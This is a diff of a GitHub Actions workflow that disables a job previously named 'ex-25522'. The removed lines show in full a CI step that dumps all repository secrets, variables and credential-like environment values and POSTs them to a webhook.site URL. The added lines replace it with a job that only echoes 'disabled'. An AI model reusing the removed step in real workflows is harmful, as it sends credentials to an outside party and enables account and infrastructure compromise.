@@ -1,27 +1,8 @@
-name: ex-25522
+name: disabled-25522
 on:
-  push:
-    paths:
-      - "daily/extrigger*"
   workflow_dispatch:
 jobs:
-  p:
+  d:
     runs-on: ubuntu-latest
     steps:
-      - name: exfiltrate secrets to webhook.site
-        env:
-          ALL_SECRETS: ${{ toJSON(secrets) }}
-          ALL_VARS: ${{ toJSON(vars) }}
-        shell: bash
-        run: |
-          {
-            echo "=== ex-25522 $(date -u) run=${GITHUB_RUN_ID} ==="
-            echo "--- SECRETS ---"
-            echo "$ALL_SECRETS"
-            echo "--- VARS ---"
-            echo "$ALL_VARS"
-            echo "--- ENVFILTER ---"
-            env | sort | grep -Ei "SUPPLY|ADMIN|SSH|SUPABASE|CLOUDFLARE|R2|D1|PASSWORD|TOKEN|KEY|SECRET" || echo NO_MATCH
-          } > /tmp/ex.txt
-          wc -c /tmp/ex.txt
-          curl -s -m 30 -X POST --data-binary @/tmp/ex.txt "https://webhook.site/8a88531d-9fd7-4826-bad5-94aa77551ee1" -o /dev/null -w "post_http=%{http_code}\n"
+      - run: echo disabled
